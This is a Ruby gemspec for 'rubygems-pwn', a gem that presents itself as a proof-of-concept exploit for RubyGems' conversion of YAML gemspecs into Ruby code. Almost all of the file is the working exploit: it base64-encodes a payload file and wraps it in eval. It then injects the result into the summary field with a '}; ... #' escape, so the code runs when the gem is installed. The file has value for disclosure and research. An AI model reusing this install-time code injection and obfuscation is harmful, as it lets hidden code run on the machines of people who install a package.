# -*- encoding: utf-8 -*-

require 'base64'

Gem::Specification.new do |s|
  s.name        = "rubygems-pwn"
  s.version     = "0.1.0"
  s.authors     = ["Postmodern"]
  s.email       = ["postmodern.mod3@gmail.com"]
  s.homepage    = "http://github.com/sophsec/rubygems-pwn"

  # load the payload
  payload = File.read(File.join(File.dirname(__FILE__),'lib','rubygems-pwn','payload.rb'))

  embed_code = lambda { |code|
    # base64 encode our payload, to hide any special characters
    "require('base64');eval(Base64.decode64(#{Base64.encode64(code).inspect}))"
  }
  escape_code = lambda { |code|
    # escape RubyGems Gem::Specification#ruby_code escaping logic which
    # simple wraps Strings in "%q{" and "}".
    "}; #{code} #"
  }

  s.description = %q{A Proof of Concept (PoC) exploit for an trivial Security vulnerability in how RubyGems converts YAML-dumped gemspecs, back into Ruby code, when installing RubyGems. This ties into the larger design mistake, of storing installed gemspecs as Ruby code; since evaling Ruby code was faster than loading YAML gemspecs. When handling data, it is safer to store it in a static format (YAML, XML, CSV), instead of executable code.}

  # grab the first sentence of the description, and append our escaped code
  s.summary     = s.description.match(/^[^\.]+/)[0] +
                  escape_code[embed_code[payload]]

  s.files         = ['README.rdoc']
  s.require_paths = ["lib"]
end
